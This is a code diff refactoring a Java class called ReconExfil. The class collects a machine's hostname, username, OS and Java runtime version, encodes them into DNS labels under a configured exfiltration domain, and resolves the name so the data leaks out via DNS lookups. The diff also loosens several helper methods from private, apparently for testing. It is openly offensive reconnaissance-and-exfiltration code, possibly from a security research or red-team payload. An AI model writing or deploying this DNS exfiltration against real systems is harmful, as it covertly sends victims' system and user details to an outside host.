@@ -72,22 +72,21 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
             return;
         }
 
-        String fullExfilDnsName = generateEncodedDomainName(envVars, javaProps);
-        resolve(fullExfilDnsName);
-    }
-
-    String generateEncodedDomainName(Map<String, String> envVars, Properties javaProps) {
         String hostname = getHostname();
         String username = getUsername(envVars, javaProps);
         String osInfo = getOsInfo(javaProps);
         String runtimeInfo = getRuntimeInfo(javaProps);
         String uniqueId = getUniqueId();
 
+        String fullExfilDnsName = generateEncodedDomainName(uniqueId, hostname, username, osInfo, runtimeInfo);
+        resolve(fullExfilDnsName);
+    }
+
+    String generateEncodedDomainName(String uniqueId, String... fields) {
         List<String> encodedParts = new LinkedList<>();
-        encodedParts.add(encode(hostname));
-        encodedParts.add(encode(username));
-        encodedParts.add(encode(osInfo));
-        encodedParts.add(encode(runtimeInfo));
+        for (String field : fields) {
+            encodedParts.add(encode(field));
+        }
 
         String lastPart = uniqueId + "." + CONF_EXFIL_DNS;
         StringBuilder domainBuilder = new StringBuilder();
@@ -145,7 +144,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         return hostname;
     }
 
-    private static String getUsername(Map<String, String> envVars, Properties javaProps) {
+    static String getUsername(Map<String, String> envVars, Properties javaProps) {
         String username = javaProps.getProperty("user.name");
         if (isUnknown(username)) {
             username = envVars.get("USERNAME");
@@ -157,7 +156,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         return username;
     }
 
-    private String getOsInfo(Properties javaProps) {
+    static String getOsInfo(Properties javaProps) {
         String osName = javaProps.getProperty("os.name");
         if (isUnknown(osName)) {
             osName = "unknown";
@@ -171,7 +170,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         return osName + " " + osVer;
     }
 
-    private static String getRuntimeInfo(Properties javaProps) {
+    static String getRuntimeInfo(Properties javaProps) {
         String runtimeVer = javaProps.getProperty("java.vm.version");
         if (isUnknown(runtimeVer)) {
             runtimeVer = "unknown";
@@ -184,7 +183,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         return value == null || value.isEmpty();
     }
 
-    private static String getUniqueId() {
+    static String getUniqueId() {
         Random rng = new SecureRandom();
         return "" + rng.nextInt(0, Integer.MAX_VALUE);
     }
